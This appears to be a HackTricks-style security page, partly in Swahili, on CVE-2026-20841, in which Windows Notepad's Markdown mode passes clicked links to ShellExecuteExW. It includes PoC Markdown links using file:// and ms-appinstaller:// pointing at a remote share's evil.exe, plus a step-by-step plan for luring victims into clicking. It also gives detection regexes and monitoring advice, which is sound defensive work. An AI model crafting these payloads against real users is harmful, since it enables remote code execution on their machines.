# Windows Protocol Handler / ShellExecute Abuse (Markdown Renderers)

{{#include ../banners/hacktricks-training.md}}

Maombi ya kisasa ya Windows yanayochora Markdown/HTML mara nyingi hubadilisha viungo vinavyotolewa na mtumiaji kuwa vitu vinavyoweza kubonyezwa na kuvipelekea `ShellExecuteExW`. Bila strict scheme allowlisting, handler yoyote wa protocol iliyosajiliwa (mfano, `file:`, `ms-appinstaller:`) inaweza kuamshwa, ikisababisha utekelezaji wa code katika muktadha wa mtumiaji wa sasa.

## ShellExecuteExW surface in Windows Notepad Markdown mode
- Notepad huchagua Markdown mode **kwa `.md` extensions pekee** kupitia kulinganisha kamba iliyowekwa katika `sub_1400ED5D0()`.
- Supported Markdown links:
- Standard: `[text](target)`
- Autolink: `<target>` (rendered as `[target](target)`), hivyo sintaksia zote mbili zina umuhimu kwa payloads na detections.
- Link clicks are processed in `sub_140170F60()`, ambayo hufanya uchujaji dhaifu kisha huita `ShellExecuteExW`.
- `ShellExecuteExW` hutuma kwa **protocol handler yoyote iliyosanidiwa**, si HTTP(S) pekee.

### Payload considerations
- Mfuatano wowote wa `\\` kwenye kiungo **huwekwa sawa hadi `\`** kabla ya `ShellExecuteExW`, ikioathiri uundaji wa UNC/paths na detection.
- Faili za `.md` **hazihusiani na Notepad kwa default**; mwanaathirika bado lazima afungue faili katika Notepad na abofye kiungo, lakini mara zinapochorwa, kiungo kinaweza kubonyezwa.
- Dangerous example schemes:
- `file://` to launch a local/UNC payload.
- `ms-appinstaller://` to trigger App Installer flows. Skimu nyingine zilizorasili kienyeji pia zinaweza kutumiwa vibaya.

### Minimal PoC Markdown
```markdown
[run](file://\\192.0.2.10\\share\\evil.exe)
<ms-appinstaller://\\192.0.2.10\\share\\pkg.appinstaller>
```
### Exploitation flow
1. Tengeneza **`.md` file** ili Notepad iione kama Markdown.
2. Weka kiungo ukitumia URI scheme hatari (`file:`, `ms-appinstaller:`, au handler yoyote iliyowekwa).
3. Sambaza faili (HTTP/HTTPS/FTP/IMAP/NFS/POP3/SMTP/SMB au sawa) na mshawishi mtumiaji aifungue katika Notepad.
4. Ukibonyeza, kiungo kilichosawazishwa kinatekelezwa na `ShellExecuteExW` na protocol handler husika hufanya utekelezaji wa yaliyorejelewa kwa muktadha wa mtumiaji.

## Mawazo ya utambuzi
- Fuatilia uhamisho wa `.md` files kupitia ports/protocols ambazo kawaida husambaza nyaraka: `20/21 (FTP)`, `80 (HTTP)`, `443 (HTTPS)`, `110 (POP3)`, `143 (IMAP)`, `25/587 (SMTP)`, `139/445 (SMB/CIFS)`, `2049 (NFS)`, `111 (portmap)`.
- Changanua viungo vya Markdown (standard na autolink) na tafuta **case-insensitive** `file:` au `ms-appinstaller:`.
- Vendor-guided regexes to catch remote resource access:
```
(\x3C|\[[^\x5d]+\]\()file:(\x2f|\x5c\x5c){4}
(\x3C|\[[^\x5d]+\]\()ms-appinstaller:(\x2f|\x5c\x5c){2}
```
- Tabia ya patch inaripotiwa **inaruhusu faili za ndani na HTTP(S)**; chochote kingine kinachofikia `ShellExecuteExW` kinashukiwa. Panua utambuzi kwa protocol handlers nyingine zilizosakinishwa inapohitajika, kwa kuwa uso wa shambulio unatofautiana kwa mfumo.

## Marejeo
- [CVE-2026-20841: Arbitrary Code Execution katika Notepad ya Windows](https://www.thezdi.com/blog/2026/2/19/cve-2026-20841-arbitrary-code-execution-in-the-windows-notepad)
- [CVE-2026-20841 PoC](https://github.com/BTtea/CVE-2026-20841-PoC)

{{#include ../banners/hacktricks-training.md}}
